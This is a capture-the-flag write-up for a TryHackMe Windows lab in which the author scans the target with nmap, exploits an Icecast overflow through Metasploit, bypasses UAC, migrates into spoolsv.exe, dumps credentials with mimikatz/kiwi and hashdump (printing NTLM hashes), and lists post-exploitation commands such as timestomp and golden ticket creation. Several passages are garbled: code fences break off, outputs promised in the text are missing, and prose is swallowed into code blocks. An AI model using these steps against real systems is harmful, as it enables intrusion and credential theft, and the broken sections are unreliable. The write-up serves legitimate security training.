## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using openvpn to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

PS: the room on THM has a very nice and detailed description for this setup phase :)

## Enumeration

Starting off with some standard NMAP scans:

```console
$ sudo nmap -sS --top-ports 1000 -vv MACHINE_IP 
...

Scanning MACHINE_IP [1000 ports]
Discovered open port 3389/tcp on MACHINE_IP
Discovered open port 139/tcp on MACHINE_IP

Discovered open port 8000/tcp on MACHINE_IP
Discovered open port 49153/tcp on MACHINE_IP
Discovered open port 49158/tcp on MACHINE_IP
Discovered open port 5357/tcp on MACHINE_IP
Discovered open port 49154/tcp on MACHINE_IP
Discovered open port 49152/tcp on MACHINE_IP
Discovered open port 49160/tcp on MACHINE_IP
Discovered open port 49159/tcp on MACHINE_IP

...

49159/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

...
```

***NOTE***: Even though the task description says to scan all ports, it's far quicker to scan top ports. 

```console
$ sudo nmap -sV -vv -p3389,139,445,135,8000,49153,49158,5357,49154,49152,49160,49159  MACHINE_IP 

...

445/tcp   open   microsoft-ds  syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

5357/tcp  open   http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open   http          syn-ack ttl 127 Icecast streaming media server

49160/tcp open   msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

...
```

Looking through the results of these scans, we can guess that the "more interesting ports that is open is Microsoft Remote Desktop (MSRDP)" is, in fact, port `3389`

> Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?\
> > 3389


Yet another question answered:

> What service did nmap identify as running on port 8000? (First word of this service)\
> > Icecast


We also get the answer of the final question:

> What does Nmap identify as the hostname of the machine? (All caps for the answer)\

## Gain Access

With some digging around on the website mentioned in the section's first question (https://www.cvedetails.com/), we quickly find the vulnerability: [`CVE-2004-1561`](https://www.cvedetails.com/cve/CVE-2004-1561/). To answer the first question: 

> What type of vulnerability is it?\
> > Execute Code Overflow

Furthermore, the answering the second question:

> What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000\
> > CVE-2004-1561

As directed, we'll fire up metasploit and search for an exploit: 

```console
$ sudo msfconsole -q                      
msf6 >

```

Done! Now we can move onto privilage escalation.


## Privilage Escalation


Since we now have a _meterpreter_ session going, the term's also the answer for the first question in this section: 

> What's the name of the shell we have now?\
> > meterpreter


We can get the answer to the next question like so:

```console
meterpreter > getuid
Server username: Dark-PC\Dark
```

> What user was running that Icecast process?\
> > Dark

To get some information on the system, we can execute `sysinfo`:

```console
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

We thus have the answer to the third and foutth questions:

> What build of Windows is the system?\
> > 7601

> What is the architecture of the process we're running?\
> > x64


Executing: `run post/multi/recon/local_exploit_suggester` will, as the name suggests, give us names of some potential exploits that we can make use of.

```console
meterpreter > run post/multi/recon/local_exploit_suggester

We can now background this session and move on to using the mentioned exploit to get escalated privilages. 


```console
meterpreter > background
[*] Backgrounding session 1...

msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr

Setting some options and running the exploit will get us an escalated session:


```console

This created a new session (session: 2) which we can now use to do whatever we need to do. 

There's some questions along the way that're quite obviously answered, but here's the answers just in case:

```

In case you haven't yet got a `meterpreter >` prompt up, but have a new session available, you can bring it to foreground using `sessions -i 2` or `sessions 2`:

```console

We can now view our privilages by executing `getprivs`:

## Looting

For those wondering, this phase usually involves _looting_ credentials and hashes for later or current use. 

As instructed, we'll first have a peek at the processes using `ps`:

There's a whole bunch of processes, but we're only interested in the ones that belong to `NT AUTHORITY/SYSTEM`, so I took the liberty of removing all other entries of the output.

Out of all of these processes, the ones that the room suggests we utilize for looting is `lsass.exe` (`PID 700; PPID 592`) and the service `spoolsv.exe` (`PID 1376; PPID 692`). The latter being the answer to the first question in this section:

> What's the name of the printer service?\
> > spoolsv.exe

Now, we migrate to this process, like so:
```console
meterpreter > migrate -N spoolsv.exe                                                                 
[*] Migrating from 2224 to 1376...    
[*] Migration completed successfully.
```

Now that we've migrated, let's check our uid:
```console
meterpreter > getuid                                                                 
Server username: NT AUTHORITY\SYSTEM 
```

We thus have the answer to the second question:

> Let's check what user we are now with the command `getuid`. What user is listed?\
> > `NT AUTHORITY\SYSTEM`


Now for the actual "_looting_" part. We'll load `mimikatz` for this by executing: `load mimikatz`

```console
meterpreter > load mimikatz
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.                     
Loading extension kiwi...                                                                                
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)

Success. 
```

***NOTE***: As the command output quite clearly suggest that the extenstion's name has been changed to `kiwi`, it's better to use `load kiwi` instead of `load mimikatz`.

Accessing the `help` menu as instructed:

```console
meterpreter > ?                             

...
...

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)

    ...
    ...
```

We get the answer to the next question.

> Which command allows up to retrieve all credentials? \
> > `creds_all`

And running this command gives us the answer to the question after that:

```console
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials

## Post Exploitation

Now that the machine has been exploited, time for some post-exploitation steps like leaving backdoors and removing traces.

Using the `hashdump` command dumps the contents of the SAM database. It's also the answer to the first question:

> What command allows us to dump all of the password hashes stored on the system? \
> > hashdump

```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Going through the help menu, we get answers for some more questions in this section:

> What command allows us to watch the remote user's desktop in real time?\
> > screenshare

> How about if we wanted to record from a microphone attached to the system? \
> > record_mic

> To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? \
> > timestomp

> Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?\
> > golden_ticket_create

With this last question, we can conclude this room!
